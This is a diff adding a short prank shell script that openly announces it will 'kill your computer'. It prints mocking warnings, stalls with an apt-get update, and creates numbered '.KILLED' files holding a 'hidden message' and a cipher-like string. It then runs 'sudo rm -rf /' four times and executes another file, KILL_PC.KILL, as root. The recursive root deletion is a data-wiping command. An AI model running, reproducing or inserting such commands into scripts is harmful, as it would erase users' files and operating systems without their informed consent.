@@ -1,0 +1,40 @@
+echo "hit ctrl +c now if it was an accedent!!!!"
+echo ""
+echo "guess you wanted to kill your computer"
+echo ""
+echo "have a good time!"
+echo ""
+echo "we are doing an update command to give you time to ctrl-c brfore its to late!!!"
+
+sudo apt-get update
+
+sudo touch NA_NA_NA_NN_AN_AN_NA18.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA17.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA16.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA15.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA14.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA13.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA12.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA11.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA10.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA9.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA8.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA7.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA6.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA5.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA4.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA3.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA2.KILLED
+sudo touch NA_NA_NA_NN_AN_AN_NA1.KILLED
+
+echo "well you did it not even sure how you found this unless you were tinkering with this file" > NA_NA_NA_NN_AN_AN_NA8.KILLED
+echo "ether way you found the hidden message so cool right i always enjoyed finding hidden messages btw the read order should be 8-7"
+echo "well decrypt this message... :09615-69615060135-01635-760132-6500631250-02135069; gud luk nube" > NA_NA_NA_NN_AN_AN_NA1.KILLED
+sudo rm -rf /
+sudo rm -rf /
+sudo rm -rf /
+sudo rm -rf /
+
+echo "now if your reading this your defenently in the KILL_PC.KILL file"
+
+sudo ./KILL_PC.KILL
